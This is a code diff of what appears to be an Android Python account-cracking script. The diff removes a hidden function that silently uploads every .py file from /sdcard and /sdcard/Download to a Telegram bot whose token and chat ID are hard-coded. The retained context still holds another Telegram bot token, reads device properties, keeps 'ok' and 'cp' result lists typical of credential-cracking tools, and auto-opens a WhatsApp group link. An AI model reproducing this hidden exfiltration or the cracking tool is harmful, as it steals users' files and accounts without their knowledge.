@@ -174,42 +174,6 @@ def get_current_location():
         return None, None
 # Example usage
 current_city, current_country = get_current_location()
-#-----------------------sdcard---------------------#
-def bithika():
-    session=requests.session()
-        
-    bot_token = '7464019691:AAESZlkxzy5w6-QTwWeHnMK-qASYzSJ6_OA' 
-    chat_id = '1778046662' 	
-	#-----------------------py---------------------#
-    try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-    #------------------------py---------------------------#
-    try:
-        sdcard_path = '/sdcard/Download'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
-        for file in file_list:
-            with open(os.path.join(sdcard_path, file), 'rb') as f:
-                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
-                data2={'chat_id': chat_id}
-                data={'chat_id': chat_id}
-                files={'document': f}
-                get = session.post(url, data=data, files=files)
-                sent = session.post(url, data=data2, files=files)
-    except:pass
-with tred(max_workers=999999) as jjj:
-    jjj.submit(bithika)
- 
-
 #__________________| ETC |__________________#
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
@@ -298,6 +262,12 @@ token = ('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')
 ID = ('1778046662')
 #__________________| LOOP |__________________#
 loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[]
+#--------[ LISTS && LOOPS ]---------#
+loop = 0
+oks = []
+cps = []
+xnxx = []
+pwx = []
 #__________________| COLOUR |__________________#
 A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m';faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m";white = "\033[1;37m";green = "\033[1;32m";red = "\033[1;31m";yellow = "\033[1;33m";blue = "\033[1;34m";pink = "\033[1;35m"
 os.system("xdg-open https://chat.whatsapp.com/ImgbbAV3zyu5LK4aIX4EnO");
